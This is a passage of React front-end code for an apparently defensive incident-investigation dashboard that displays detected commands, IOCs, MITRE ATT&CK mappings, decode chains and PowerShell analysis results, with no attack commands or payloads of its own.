      {/* Detected · commands + entities */}
      <div className="grid md:grid-cols-2 gap-4">
        <Section title="Detected commands" testid="fis-commands">
          {(det.commands || []).length === 0
            ? <Empty text="No command binaries detected in the incident." />
            : <ul className="space-y-2 text-xs font-mono" data-testid="fis-commands-list">
                {det.commands.map((c, i) => (
                  <li key={i} className="border border-slate-800 rounded p-2 bg-slate-950/60">
                    <div className="text-cyan-300 font-bold">{c.binary}</div>
                    <div className="text-slate-300 break-all">{c.command_line}</div>
                  </li>
                ))}
              </ul>}
        </Section>
        <Section title="Extracted entities" testid="fis-entities">
          <EntityGrid entities={det.entities || {}} />
        </Section>
      </div>

      {/* Findings */}
      <Section title="Investigation Findings" testid="fis-findings">
        {(fis.findings || []).length === 0
          ? <Empty text="No per-command findings produced." />
          : <FindingsTable findings={fis.findings} />}
      </Section>

      {/* MITRE + IOC */}
      <div className="grid md:grid-cols-2 gap-4">
        <Section title="MITRE ATT&CK" testid="fis-mitre">
          {(fis.mitre_attack || []).length === 0
            ? <Empty text="No MITRE techniques mapped." />
            : <table className="w-full text-xs">
                <thead className="text-slate-500 text-left border-b border-slate-800">
                  <tr><th className="py-1">ID</th><th className="py-1">Technique</th><th className="py-1">Tactic</th></tr>
                </thead>
                <tbody>
                  {fis.mitre_attack.map(m => (
                    <tr key={m.id} className="border-b border-slate-900">
                      <td className="py-1 font-mono text-cyan-300">
                        <a href={`https://attack.mitre.org/techniques/${m.id.split(".")[0]}/${m.id.includes(".") ? m.id.split(".")[1] + "/" : ""}`}
                           target="_blank" rel="noreferrer" className="hover:underline">{m.id}</a>
                      </td>
                      <td className="py-1 text-slate-200">{m.technique}</td>
                      <td className="py-1 text-slate-400">{m.tactic}</td>
                    </tr>
                  ))}
                </tbody>
              </table>}
        </Section>

        <Section title="IOC Summary" testid="fis-iocs">
          <EntityGrid entities={fis.iocs || {}} />
        </Section>
      </div>

      {/* OSINT / TI reputation — deterministic lookups against the local ioc DB */}
      {fis.ioc_reputation && (
        <Section title={`IOC Reputation · ${fis.ioc_reputation.summary?.matches || 0} of ${fis.ioc_reputation.summary?.total_lookups || 0} matched`}
                 testid="fis-ioc-reputation">
          {(fis.ioc_reputation.summary?.matches || 0) === 0
            ? <Empty text="No external Threat Intelligence correlations were available for the extracted IOCs at the time of investigation. Recommend re-checking against VirusTotal / Talos / MISP over the coming days." />
            : <div className="space-y-2">
                <div className="text-[10px] font-mono text-slate-500">
                  Sources contributing: {Object.entries(fis.ioc_reputation.sources || {}).map(([s, n]) => `${s} (${n})`).join(" · ")}
                </div>
                <table className="w-full text-xs">
                  <thead className="text-slate-500 text-left border-b border-slate-800">
                    <tr>
                      <th className="py-1">Kind</th>
                      <th className="py-1">Indicator</th>
                      <th className="py-1">Sources</th>
                      <th className="py-1">Severity</th>
                      <th className="py-1">Family</th>
                      <th className="py-1 text-right">Hits</th>
                    </tr>
                  </thead>
                  <tbody>
                    {Object.values(fis.ioc_reputation.by_value || {}).slice(0, 12).map((r, i) => (
                      <tr key={i} className="border-b border-slate-900 align-top" data-testid={`fis-osint-row-${i}`}>
                        <td className="py-1.5 font-mono text-slate-400">{r.kind}</td>
                        <td className="py-1.5 font-mono text-slate-200 break-all max-w-[26ch] truncate" title={r.value}>{r.value}</td>
                        <td className="py-1.5 text-slate-300">{(r.sources || []).join(", ")}</td>
                        <td className="py-1.5">
                          <span className={`px-2 py-0.5 rounded text-[10px] uppercase border ${
                            r.severity === "critical" ? "border-red-500/60 text-red-300" :
                            r.severity === "high"     ? "border-amber-500/60 text-amber-300" :
                                                        "border-sky-500/60 text-sky-300"
                          }`}>{r.severity}</span>
                        </td>
                        <td className="py-1.5 text-slate-300 font-mono">{(r.malware_families || [])[0] || "—"}</td>
                        <td className="py-1.5 text-right text-cyan-300 font-mono">{r.hit_count}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>}
        </Section>
      )}

      {/* Recommendations */}
      <Section title="Recommendations" testid="fis-recommendations">
        <ol className="space-y-2 text-sm">
          {(fis.recommendations || []).map((r, i) => (
            <li key={i} className="border-l-2 border-cyan-500/40 pl-3">
              <div className="flex items-baseline gap-2">
                <span className={`text-[10px] uppercase tracking-wide px-2 py-0.5 rounded-full border ${
                  r.priority === "critical" ? "border-red-500/60 text-red-300" :
                  r.priority === "high"     ? "border-amber-500/60 text-amber-300" :
                                              "border-sky-500/60 text-sky-300"
                }`}>{r.priority}</span>
                <span className="text-slate-100 font-medium">{r.action}</span>
              </div>
              {r.rationale && <div className="text-xs text-slate-400 mt-1">{r.rationale}</div>}
            </li>
          ))}
        </ol>
      </Section>

      {/* Evidence counts */}
      <Section title="Evidence counts" testid="fis-evidence-counts">
        <div className="grid grid-cols-3 sm:grid-cols-6 gap-3 text-xs">
          {Object.entries(fis.evidence_counts || {}).map(([k, v]) => (
            <div key={k} className="border border-slate-800 rounded p-2 bg-slate-950/60 text-center">
              <div className="text-[10px] text-slate-500 uppercase tracking-wide">{k}</div>
              <div className="text-lg font-bold text-slate-100 font-mono">{v}</div>
            </div>
          ))}
        </div>
      </Section>

      {/* Investigation Quality Dashboard — deterministic scorecard */}
      {fis.investigation_quality && (
        <QualityDashboard q={fis.investigation_quality} />
      )}

      {/* Decode pipeline status — surfaces per-command timeouts, size caps, errors */}
      {result.decode_pipeline && <DecodePipelineStatus dp={result.decode_pipeline} />}
    </section>
  );
}

function DecodePipelineStatus({ dp }) {
  const gt = dp.guardrails_triggered || {};
  const bad = (gt.timeouts || 0) + (gt.size_exceeded || 0) + (gt.errors || 0)
            + (gt.commands_dropped || 0) + (gt.incident_truncated ? 1 : 0);
  return (
    <Section title={`Decoder Pipeline · ${(dp.statuses || []).length} commands processed`}
             testid="fis-decode-pipeline">
      {bad === 0 && (
        <div className="text-sm text-emerald-300" data-testid="decode-pipeline-clean">
          ✓ Every extracted command completed within the configured decode budget.
          Investigation is complete.
        </div>
      )}
      {bad > 0 && (
        <div className="text-sm text-amber-300 mb-3" data-testid="decode-pipeline-partial">
          ⚠ Investigation completed with partial results.
          {gt.timeouts     ? ` ${gt.timeouts} command(s) exceeded the per-command time budget.` : ""}
          {gt.size_exceeded? ` ${gt.size_exceeded} command(s) exceeded the payload-size budget.` : ""}
          {gt.errors       ? ` ${gt.errors} command(s) errored during decoding.` : ""}
          {gt.commands_dropped ? ` ${gt.commands_dropped} additional command(s) were skipped after reaching the per-incident cap.` : ""}
          {gt.incident_truncated ? " The incident text was truncated to fit the maximum incident size." : ""}
          &nbsp;The remainder of the investigation continued on the successfully-decoded evidence.
        </div>
      )}
      <details className="text-xs">
        <summary className="cursor-pointer text-slate-400 hover:text-slate-200">
          Show per-command decode status ({(dp.statuses || []).length})
        </summary>
        <table className="w-full mt-2 text-xs">
          <thead>
            <tr className="text-slate-500 text-left border-b border-slate-800">
              <th className="py-1">#</th><th className="py-1">Binary</th>
              <th className="py-1">Status</th><th className="py-1 text-right">Bytes</th>
              <th className="py-1 text-right">Time</th><th className="py-1">Detail</th>
            </tr>
          </thead>
          <tbody>
            {(dp.statuses || []).map((s, i) => (
              <tr key={i} className="border-b border-slate-900" data-testid={`decode-row-${i}`}>
                <td className="py-1 text-slate-500 font-mono">{i + 1}</td>
                <td className="py-1 font-mono text-cyan-300">{s.binary}</td>
                <td className="py-1">
                  <span className={`px-2 py-0.5 rounded text-[10px] uppercase font-bold border ${
                    s.status === "complete"      ? "text-emerald-300 border-emerald-500/50 bg-emerald-500/10" :
                    s.status === "timeout"       ? "text-amber-300 border-amber-500/50 bg-amber-500/10" :
                    s.status === "size_exceeded" ? "text-orange-300 border-orange-500/50 bg-orange-500/10" :
                                                    "text-red-300 border-red-500/50 bg-red-500/10"
                  }`}>{s.status}</span>
                </td>
                <td className="py-1 text-right font-mono text-slate-300">{(s.bytes || 0).toLocaleString()}</td>
                <td className="py-1 text-right font-mono text-slate-300">{s.seconds != null ? `${s.seconds}s` : "—"}</td>
                <td className="py-1 text-slate-400 max-w-md">{s.message || ""}</td>
              </tr>
            ))}
          </tbody>
        </table>
        <div className="mt-2 text-[10px] font-mono text-slate-500">
          Budgets: {(dp.budgets?.max_command_bytes || 0).toLocaleString()} bytes / command ·
          &nbsp;{dp.budgets?.max_command_seconds}s / command ·
          &nbsp;{dp.budgets?.max_commands_per_incident} commands / incident
        </div>
      </details>
    </Section>
  );
}

// ─── Investigation Quality Dashboard ────────────────────────────
function QualityDashboard({ q }) {
  const completeness = q.overall?.investigation_completeness ?? 0;
  const ready        = !!q.overall?.ready_for_analyst_review;
  return (
    <section className="border rounded-xl p-5"
             data-testid="fis-quality"
             style={{
               background: "linear-gradient(135deg, #0a1628 0%, #051020 100%)",
               borderColor: ready ? "rgba(52,211,153,0.35)" : "rgba(245,158,11,0.35)",
             }}>
      <div className="flex items-center justify-between mb-4">
        <div>
          <div className="text-[10px] tracking-[0.24em] font-bold text-slate-400">
            INVESTIGATION QUALITY
          </div>
          <div className="text-lg font-bold mt-1"
               style={{ color: ready ? "#4ADE80" : "#F59E0B" }}
               data-testid="quality-headline">
            Overall Completeness · {completeness}%
          </div>
        </div>
        <div className="text-right">
          <span className={`px-3 py-1 rounded-full text-xs font-bold border ${
            ready ? "text-emerald-300 border-emerald-500/50 bg-emerald-500/10"
                  : "text-amber-300 border-amber-500/50 bg-amber-500/10"
          }`} data-testid="quality-ready">
            {ready ? "READY FOR ANALYST REVIEW" : "REVIEW GAPS BELOW"}
          </span>
        </div>
      </div>

      {/* Completeness bar */}
      <div className="mb-5">
        <div className="h-2 rounded-full overflow-hidden bg-slate-800/60">
          <div className="h-full rounded-full transition-all"
               style={{
                 width: `${completeness}%`,
                 background: ready
                   ? "linear-gradient(90deg,#10B981,#4ADE80)"
                   : "linear-gradient(90deg,#F59E0B,#FCD34D)",
               }} />
        </div>
        <div className="mt-1 flex justify-between text-[9px] font-mono text-slate-500">
          {Object.entries(q.overall?.axes || {}).map(([k, v]) => (
            <span key={k} title={`${k}: ${v}%`}>{k} {v}%</span>
          ))}
        </div>
      </div>

      <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
        <FlagGroup title="Evidence Processing" data={q.evidence_processing} />
        <KVGroup   title="Command Analysis"   data={q.command_analysis} highlight={{ decode_ratio: true, failed_decodes: true }} />
        <KVGroup   title="Coverage"           data={q.coverage} />
        <NumberGroup title="Confidence"       data={q.confidence} />
        <FlagGroup title="Validation"         data={q.validation} />
      </div>
    </section>
  );
}

function FlagGroup({ title, data }) {
  return (
    <div className="border border-slate-800 rounded-lg p-3 bg-slate-950/50">
      <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{title.toUpperCase()}</div>
      <ul className="space-y-1">
        {Object.entries(data || {}).map(([k, v]) => (
          <li key={k}
              data-testid={`quality-flag-${k}`}
              className="flex items-center justify-between">
            <span className="text-slate-300 font-mono text-[11px]">
              {k.replace(/_/g, " ")}
            </span>
            <span className={`font-bold text-[10px] px-2 py-0.5 rounded ${
              v ? "text-emerald-300 bg-emerald-500/10 border border-emerald-500/40"
                : "text-red-300 bg-red-500/10 border border-red-500/40"
            }`}>
              {v ? "PASS" : "FAIL"}
            </span>
          </li>
        ))}
      </ul>
    </div>
  );
}

function KVGroup({ title, data, highlight = {} }) {
  return (
    <div className="border border-slate-800 rounded-lg p-3 bg-slate-950/50">
      <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{title.toUpperCase()}</div>
      <ul className="space-y-1">
        {Object.entries(data || {}).map(([k, v]) => (
          <li key={k}
              data-testid={`quality-kv-${k}`}
              className="flex items-center justify-between">
            <span className="text-slate-300 font-mono text-[11px]">
              {k.replace(/_/g, " ")}
            </span>
            <span className={`font-mono font-bold text-[11px] ${
              highlight[k] && String(v).includes("/") ? "text-cyan-300"
                : highlight[k] && v > 0                ? "text-amber-300"
                : "text-slate-100"
            }`}>{String(v)}</span>
          </li>
        ))}
      </ul>
    </div>
  );
}

function NumberGroup({ title, data }) {
  return (
    <div className="border border-slate-800 rounded-lg p-3 bg-slate-950/50">
      <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{title.toUpperCase()}</div>
      <ul className="space-y-2">
        {Object.entries(data || {}).map(([k, v]) => (
          <li key={k} data-testid={`quality-conf-${k}`}>
            <div className="flex justify-between text-[11px]">
              <span className="text-slate-300 font-mono">{k.replace(/_/g, " ")}</span>
              <span className="font-mono font-bold text-slate-100">{v}%</span>
            </div>
            <div className="h-1 mt-1 rounded-full bg-slate-800/60 overflow-hidden">
              <div className="h-full rounded-full"
                   style={{
                     width: `${v}%`,
                     background: v >= 80 ? "#10B981"
                                : v >= 50 ? "#F59E0B"
                                :           "#EF4444",
                   }} />
            </div>
          </li>
        ))}
      </ul>
    </div>
  );
}

function Section({ title, testid, children }) {
  return (
    <section className="border border-slate-700/60 bg-slate-900/40 rounded-xl p-4"
             data-testid={testid}>
      <h3 className="text-xs uppercase tracking-widest text-slate-400 font-bold mb-3">{title}</h3>
      {children}
    </section>
  );
}

function Empty({ text }) {
  return <div className="text-xs text-slate-500 italic">{text}</div>;
}

function EntityGrid({ entities }) {
  const SPECIAL = new Set(["user_agents", "strings"]);
  const specialBuckets = Object.entries(entities).filter(
    ([k, v]) => SPECIAL.has(k) && Array.isArray(v) && v.length > 0);
  const buckets = Object.entries(entities).filter(
    ([k, v]) => !SPECIAL.has(k) && Array.isArray(v) && v.length > 0);
  if (buckets.length === 0 && specialBuckets.length === 0)
    return <Empty text="No indicators of compromise extracted." />;
  return (
    <div className="space-y-3">
      {buckets.length > 0 && (
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
          {buckets.map(([label, values]) => (
            <div key={label} className="border border-slate-800 rounded p-2 bg-slate-950/60">
              <div className="text-[10px] text-slate-500 uppercase tracking-wide mb-1">
                {label} ({values.length})
              </div>
              <ul className="text-xs font-mono text-slate-200 space-y-0.5 break-all">
                {values.slice(0, 6).map((v, i) => <li key={i}>{v}</li>)}
                {values.length > 6 && <li className="text-slate-500">…{values.length - 6} more</li>}
              </ul>
            </div>
          ))}
        </div>
      )}
      {/* User-Agents get a full-width block because they're long. */}
      {(entities.user_agents || []).length > 0 && (
        <div className="border border-violet-500/40 rounded p-2.5 bg-violet-500/5"
             data-testid="ioc-user-agents">
          <div className="text-[10px] text-violet-300 uppercase tracking-widest mb-1.5 font-bold">
            User-Agents ({entities.user_agents.length})
          </div>
          <ul className="text-xs font-mono text-slate-200 space-y-1 break-all">
            {entities.user_agents.map((v, i) => (
              <li key={i} className="border-l-2 border-violet-500/40 pl-2">{v}</li>
            ))}
          </ul>
        </div>
      )}
      {/* Extracted printable strings — dense two-column layout with expansion. */}
      {(entities.strings || []).length > 0 && (
        <div className="border border-amber-500/40 rounded p-2.5 bg-amber-500/5"
             data-testid="ioc-strings">
          <div className="flex items-center justify-between mb-1.5">
            <div className="text-[10px] text-amber-300 uppercase tracking-widest font-bold">
              Extracted strings ({entities.strings.length})
            </div>
            <div className="text-[10px] text-slate-500">click any string to expand · from recovered payload</div>
          </div>
          <StringsList strings={entities.strings} testid="ioc-strings-list" initialCap={12} />
        </div>
      )}
    </div>
  );
}

// ─── Markdown export ─────────────────────────────────────────────
function renderMarkdown(result) {
  const fis = result.final_incident_summary || {};
  const det = result.detected || {};
  const lines = [];
  lines.push(`# NivXRay · Final Incident Summary`);
  lines.push("");
  lines.push(`- **Verdict:** ${fis.verdict}`);
  lines.push(`- **Severity:** ${fis.severity}`);
  lines.push(`- **Classification:** ${fis.classification}`);
  lines.push(`- **Confidence:** ${fis.confidence?.score ?? 0}% — ${fis.confidence?.reason ?? ""}`);
  lines.push("");
  lines.push("## Executive Summary");
  (fis.executive_summary || []).forEach(p => { lines.push(p); lines.push(""); });
  lines.push("## Detected commands");
  (det.commands || []).forEach(c => lines.push(`- \`${c.binary}\` — ${c.command_line}`));
  lines.push("");
  lines.push("## MITRE ATT&CK");
  (fis.mitre_attack || []).forEach(m => lines.push(`- **${m.id}** · ${m.technique} · ${m.tactic}`));
  lines.push("");
  lines.push("## IOCs");
  Object.entries(fis.iocs || {}).forEach(([k, v]) => {
    if (Array.isArray(v) && v.length) lines.push(`- **${k}**: ${v.join(", ")}`);
  });
  lines.push("");
  lines.push("## Recommendations");
  (fis.recommendations || []).forEach(r => lines.push(`- **[${r.priority}]** ${r.action} — ${r.rationale}`));
  lines.push("");
  lines.push("---");
  lines.push("*Deterministic report — every conclusion is evidence-linked. Original incident text is preserved verbatim in the JSON export.*");
  return lines.join("\n");
}

function markdownInline(s) {
  // Very small subset: **bold** and `code`.
  return String(s || "")
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/\*\*(.+?)\*\*/g, '<b class="text-slate-100">$1</b>')
    .replace(/`([^`]+)`/g, '<code class="font-mono text-cyan-300">$1</code>');
}


// ─── Live Progress card (P0.1 · WebSocket streaming) ────────────
const STAGE_ORDER = ["parsing", "decoding", "aggregating", "osint", "reporting", "done"];
const STAGE_TONE = {
  parsing:     { color: "text-sky-300",     ring: "border-sky-500/50",     bg: "bg-sky-500/10" },
  decoding:    { color: "text-cyan-300",    ring: "border-cyan-500/50",    bg: "bg-cyan-500/10" },
  aggregating: { color: "text-amber-300",   ring: "border-amber-500/50",   bg: "bg-amber-500/10" },
  osint:       { color: "text-violet-300",  ring: "border-violet-500/50",  bg: "bg-violet-500/10" },
  reporting:   { color: "text-emerald-300", ring: "border-emerald-500/50", bg: "bg-emerald-500/10" },
  done:        { color: "text-emerald-200", ring: "border-emerald-500/70", bg: "bg-emerald-500/15" },
};
const CMD_STATUS_TONE = {
  complete:      "border-emerald-500/50 text-emerald-200 bg-emerald-500/10",
  timeout:       "border-amber-500/50 text-amber-200 bg-amber-500/10",
  size_exceeded: "border-amber-500/50 text-amber-200 bg-amber-500/10",
  error:         "border-red-500/50 text-red-200 bg-red-500/10",
};

function LiveProgress({ progress, jobId }) {
  const stage = progress?.stage || "queued";
  const percent = Math.max(0, Math.min(100, progress?.percent ?? 0));
  const tone = STAGE_TONE[stage] || STAGE_TONE.parsing;
  const commands = progress?.commands || [];
  const parse = progress?.parseInfo;
  const osint = progress?.osint;
  const currentStageIdx = STAGE_ORDER.indexOf(stage);
  return (
    <section className={`border ${tone.ring} rounded-xl p-5 ${tone.bg}`}
             data-testid="live-progress">
      <div className="flex items-baseline justify-between mb-3">
        <div>
          <div className="text-[10px] tracking-[0.24em] font-bold text-cyan-300">
            LIVE INVESTIGATION · WEBSOCKET STREAM
          </div>
          <h3 className={`text-lg font-bold ${tone.color}`} data-testid="live-progress-stage">
            {stage.toUpperCase()} · {percent}%
          </h3>
          <p className="text-xs text-slate-300 mt-1" data-testid="live-progress-message">
            {progress?.message || "Streaming events…"}
          </p>
        </div>
        {jobId && (
          <div className="text-[10px] font-mono text-slate-500" data-testid="live-progress-job-id">
            Job: {jobId}
          </div>
        )}
      </div>
      {/* Progress bar */}
      <div className="h-2 w-full bg-slate-800 rounded-full overflow-hidden mb-4"
           data-testid="live-progress-bar-wrap">
        <div className="h-full bg-gradient-to-r from-cyan-500 to-emerald-400 transition-all duration-300"
             style={{ width: `${percent}%` }}
             data-testid="live-progress-bar" />
      </div>
      {/* Stage ladder */}
      <div className="flex flex-wrap gap-2 mb-4" data-testid="live-progress-stages">
        {STAGE_ORDER.filter(s => s !== "done").map((s, i) => {
          const done = i < currentStageIdx || stage === "done";
          const active = s === stage;
          const t = STAGE_TONE[s];
          return (
            <span key={s}
                  data-testid={`live-stage-${s}`}
                  className={`px-2.5 py-1 rounded-full text-[10px] uppercase tracking-widest border font-bold
                    ${active ? `${t.color} ${t.ring} ${t.bg}`
                             : done ? "text-emerald-300 border-emerald-600/50 bg-emerald-500/5"
                                    : "text-slate-500 border-slate-700"}`}>
              {done && !active && "✓ "}{s}
            </span>
          );
        })}
      </div>
      {/* Parse info */}
      {parse && (
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2 mb-3" data-testid="live-parse-info">
          <StatCell label="Commands" value={parse.commands_detected} />
          <StatCell label="IOCs" value={parse.iocs_total} />
          <StatCell label="Incident size" value={`${((parse.incident_bytes||0)/1024).toFixed(1)} KB`} />
          <StatCell label="Truncated" value={parse.incident_truncated ? "Yes" : "No"}
                    warn={parse.incident_truncated} />
        </div>
      )}
      {/* Per-command decode stream */}
      {commands.length > 0 && (
        <div className="border border-slate-800 rounded-lg overflow-hidden" data-testid="live-command-table">
          <div className="grid grid-cols-[auto_1fr_auto_auto_auto] gap-x-3 px-3 py-1.5 text-[10px] uppercase tracking-widest text-slate-500 bg-slate-950/60">
            <span>#</span><span>Binary</span><span>Bytes</span><span>Time</span><span>Status</span>
          </div>
          {commands.map((c, i) => (
            <div key={i}
                 data-testid={`live-command-row-${i}`}
                 className="grid grid-cols-[auto_1fr_auto_auto_auto] gap-x-3 px-3 py-1.5 text-xs border-t border-slate-800 items-center">
              <span className="font-mono text-slate-500">{(c.index ?? i) + 1}</span>
              <span className="font-mono text-slate-200 truncate">{c.binary}</span>
              <span className="font-mono text-slate-400">{(c.bytes || 0).toLocaleString()}</span>
              <span className="font-mono text-slate-400">{c.seconds ?? "—"}s</span>
              <span className={`px-2 py-0.5 rounded-full border text-[10px] uppercase tracking-widest font-bold
                ${CMD_STATUS_TONE[c.status] || "border-slate-600 text-slate-300"}`}>
                {c.status}
              </span>
            </div>
          ))}
        </div>
      )}
      {/* OSINT summary as soon as it lands */}
      {osint && (
        <div className="mt-3 text-xs text-slate-300" data-testid="live-osint-summary">
          <span className="text-violet-300 font-bold">Threat Intel: </span>
          {osint.matches} of {osint.total_lookups} indicator(s) matched local corpus
          {Object.keys(osint.sources || {}).length > 0 && (
            <span className="ml-2 text-slate-500">
              · sources: {Object.keys(osint.sources).slice(0, 4).join(", ")}
            </span>
          )}
        </div>
      )}
      {/* Decode Tree — live per-command recursive chain */}
      {(progress?.chains || []).length > 0 && (
        <div className="mt-4">
          <div className="text-[10px] tracking-[0.24em] font-bold text-cyan-300 mb-2"
               data-testid="live-decode-tree-header">
            RECURSIVE DECODE TREE · {progress.chains.length} chain(s)
          </div>
          <div className="space-y-2">
            {progress.chains.map((c, i) => (
              <DecodeChainCard key={i} chain={c} />
            ))}
          </div>
        </div>
      )}
    </section>
  );
}

function StatCell({ label, value, warn }) {
  return (
    <div className={`border rounded p-2 ${warn ? "border-amber-500/40 bg-amber-500/5" : "border-slate-800 bg-slate-950/50"}`}>
      <div className="text-[10px] uppercase tracking-wide text-slate-500">{label}</div>
      <div className={`text-sm font-bold ${warn ? "text-amber-300" : "text-slate-100"}`}>{value}</div>
    </div>
  );
}


// ─── Decode Tree components (P0.3 · Recursive Decode Chain) ─────
const DECODER_TONE = {
  "base64-decode":  { color: "text-cyan-300",    bg: "bg-cyan-500/10",    border: "border-cyan-500/40" },
  "utf16-decode":   { color: "text-teal-300",    bg: "bg-teal-500/10",    border: "border-teal-500/40" },
  "gzip-decode":    { color: "text-emerald-300", bg: "bg-emerald-500/10", border: "border-emerald-500/40" },
  "hex-decode":     { color: "text-lime-300",    bg: "bg-lime-500/10",    border: "border-lime-500/40" },
  "url-decode":     { color: "text-sky-300",     bg: "bg-sky-500/10",     border: "border-sky-500/40" },
  "extract-wrapper":{ color: "text-violet-300",  bg: "bg-violet-500/10",  border: "border-violet-500/40" },
  "ioc-extractor":  { color: "text-amber-300",   bg: "bg-amber-500/10",   border: "border-amber-500/40" },
};
function decoderTone(d) {
  return DECODER_TONE[d] || { color: "text-slate-300", bg: "bg-slate-800/40", border: "border-slate-700" };
}

function VerdictBadge({ verdict, risk }) {
  const tone = VERDICT_TONE[verdict] || VERDICT_TONE.unknown;
  return (
    <span className={`px-2 py-0.5 rounded-full border text-[10px] uppercase tracking-widest font-bold ${tone}`}>
      {verdict}{typeof risk === "number" && verdict !== "unknown" ? ` · ${risk}` : ""}
    </span>
  );
}

function DecodeChainCard({ chain }) {
  const layers = chain?.layers || [];
  return (
    <div className="border border-slate-700 rounded-lg bg-slate-950/60 overflow-hidden"
         data-testid={`decode-chain-${chain.index}`}>
      <header className="flex flex-wrap items-center gap-2 px-3 py-2 border-b border-slate-800 bg-slate-900/40">
        <span className="text-[10px] font-mono text-slate-500">#{chain.index + 1}</span>
        <span className="font-mono text-sm text-cyan-300">{chain.binary}</span>
        {chain.cache_hit && (
          <span className="px-2 py-0.5 rounded-full text-[10px] uppercase tracking-widest font-bold
                           border border-emerald-500/50 text-emerald-300 bg-emerald-500/10"
                data-testid={`cache-hit-${chain.index}`}>
            cache hit
          </span>
        )}
        <span className="text-[10px] text-slate-500">layers: <span className="text-slate-200 font-bold">{chain.layer_count}</span></span>
        {chain.terminal && (
          <span className="text-[10px] text-slate-500">terminal: <span className="text-slate-200">{chain.terminal}</span></span>
        )}
        <div className="ml-auto flex items-center gap-2">
          <VerdictBadge verdict={chain.verdict} risk={chain.risk_score} />
          {(chain.mitre_ids || []).length > 0 && (
            <span className="text-[10px] font-mono text-slate-400">
              {chain.mitre_ids.slice(0, 4).join(" ")}
              {chain.mitre_ids.length > 4 && ` +${chain.mitre_ids.length - 4}`}
            </span>
          )}
        </div>
      </header>
      {chain.command_line && (
        <div className="px-3 py-2 border-b border-slate-800 text-[11px] font-mono text-slate-400 break-all">
          {chain.command_line}
        </div>
      )}
      {layers.length === 0 ? (
        <div className="px-3 py-3 text-xs text-slate-500 italic">
          No recursive layers surfaced — the deterministic engine treated this input as terminal.
        </div>
      ) : (
        <ol className="p-3 space-y-1.5" data-testid={`decode-chain-layers-${chain.index}`}>
          {layers.map((L, i) => {
            const tone = decoderTone(L.decoder);
            const isLast = i === layers.length - 1;
            const iocsInLayer = Object.entries(L.sub_iocs || {}).flatMap(([k, vs]) => vs.map(v => ({k, v})));
            return (
              <li key={i} className="flex items-start gap-3" data-testid={`layer-${chain.index}-${i}`}>
                <div className="flex flex-col items-center pt-0.5" aria-hidden>
                  <span className={`w-5 h-5 rounded-full border ${tone.border} ${tone.bg} flex items-center justify-center text-[10px] font-mono ${tone.color}`}>
                    {L.layer ?? i}
                  </span>
                  {!isLast && <span className="w-px flex-1 bg-slate-800 mt-0.5" style={{ minHeight: 24 }} />}
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex flex-wrap items-baseline gap-2">
                    <span className={`text-xs font-mono font-bold ${tone.color}`}>{L.decoder}</span>
                    <span className="text-[10px] text-slate-500">conf {Math.round((L.confidence || 0) * 100)}%</span>
                    <span className="text-[10px] text-slate-500">·</span>
                    <span className="text-[10px] font-mono text-slate-400">
                      {L.in_len ?? "?"}B → {L.out_len ?? "?"}B
                    </span>
                    <span className="text-[10px] text-slate-500">·</span>
                    <span className="text-[10px] font-mono text-slate-400">{L.exec_ms ?? 0}ms</span>
                  </div>
                  {L.why && (
                    <div className="text-[11px] text-slate-400 mt-0.5">{L.why}</div>
                  )}
                  {L.preview && (
                    <pre className="mt-1 px-2 py-1 bg-slate-950/80 border border-slate-800 rounded text-[10px] font-mono text-slate-300 whitespace-pre-wrap break-all leading-snug">
                      {L.preview}
                    </pre>
                  )}
                  {iocsInLayer.length > 0 && (
                    <div className="mt-1 flex flex-wrap gap-1">
                      {iocsInLayer.slice(0, 8).map((it, ii) => (
                        <span key={ii} className="px-1.5 py-0.5 rounded border border-amber-500/40 bg-amber-500/10 text-[10px] font-mono text-amber-200">
                          {it.k}: {it.v}
                        </span>
                      ))}
                    </div>
                  )}
                </div>
              </li>
            );
          })}
        </ol>
      )}
      {/* Per-chain enrichment surfaced from the recovered payload */}
      <ChainEnrichment enrichment={chain.enrichment} chainIndex={chain.index} />
      {/* Deterministic PowerShell semantic pass */}
      <ChainSemantic semantic={chain.semantic} chainIndex={chain.index} />
    </div>
  );
}

const CLS_TONE = {
  loopback:   "border-emerald-500/60 text-emerald-200 bg-emerald-500/10",
  private:    "border-sky-500/60 text-sky-200 bg-sky-500/10",
  link_local: "border-sky-500/60 text-sky-200 bg-sky-500/10",
  external:   "border-red-500/60 text-red-200 bg-red-500/10",
  multicast:  "border-amber-500/60 text-amber-200 bg-amber-500/10",
  reserved:   "border-slate-500/60 text-slate-200 bg-slate-500/10",
  invalid:    "border-slate-600 text-slate-400",
};

function ChainSemantic({ semantic, chainIndex }) {
  if (!semantic || !semantic.detected) return null;
  const ast = semantic.ast || [];
  const arts = semantic.artifacts || [];
  const behaviors = semantic.behaviors || [];
  const outcomeTone = {
    fully_decoded:     "border-emerald-500/50 text-emerald-200 bg-emerald-500/10",
    partially_decoded: "border-amber-500/50 text-amber-200 bg-amber-500/10",
    encrypted_payload: "border-red-500/50 text-red-200 bg-red-500/10",
    unsupported_encoding: "border-slate-600 text-slate-400 bg-slate-800/40",
  }[semantic.decode_outcome] || "border-slate-600 text-slate-400";
  return (
    <div className="border-t border-cyan-500/30 bg-slate-950/60 p-3 space-y-3"
         data-testid={`chain-semantic-${chainIndex}`}>
      <div className="flex flex-wrap items-baseline gap-2">
        <div className="text-[10px] tracking-[0.24em] font-bold text-cyan-300">
          POWERSHELL SEMANTIC ANALYSIS
        </div>
        <span className={`px-2 py-0.5 rounded-full border text-[10px] uppercase tracking-widest font-bold ${outcomeTone}`}
              data-testid={`semantic-outcome-${chainIndex}`}>
          {(semantic.decode_outcome || "").replace(/_/g, " ")}
        </span>
        <VerdictBadge verdict={semantic.verdict} risk={semantic.risk_score} />
        <span className="text-[10px] text-slate-400 font-mono">
          conf {semantic.confidence}%
        </span>
      </div>
      {semantic.recovered_script && (
        <div>
          <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1">Recovered PowerShell</div>
          <pre className="px-2 py-1.5 bg-slate-950/80 border border-slate-800 rounded text-[11px] font-mono text-emerald-200 whitespace-pre-wrap break-all leading-snug"
